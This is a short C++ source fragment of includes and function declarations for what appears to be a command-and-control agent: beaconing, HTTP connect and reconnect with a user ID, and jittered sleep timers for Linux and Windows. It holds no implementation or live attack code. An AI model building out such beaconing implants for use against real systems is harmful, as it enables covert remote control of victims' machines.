#include <iostream>
#include <string>
#include <vector>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>
#include <json/json.h>
#include <thread>
#include <chrono>
#include <cstdlib> 


#ifdef __unix__
#define OS "Linux"
#include "../../Linux/generic.hpp"
#endif

#ifdef WIN32
#define OS "Windows"
#include "../Windows/generic.hpp"
#endif


size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
std::tuple<int, std::string, std::string> getRequest(const std::string& url);
std::tuple<int, std::string, int> httpConnection(const std::string& address);
std::tuple<int, std::string, int> httpReconnect(const std::string& address, const std::string& user_id, int jitter, int timer);
int beacon();
int calculateSleepTime(int timer, int jitter);
void sleepFor(int seconds);
std::tuple<int, std::string, std::string> getRequest(const std::string& url);
bool handleResponse(const std::string& response_body, int& timer, const std::string& ID);
int retryRequest(const std::string& url, int attempts, int sleepTime);
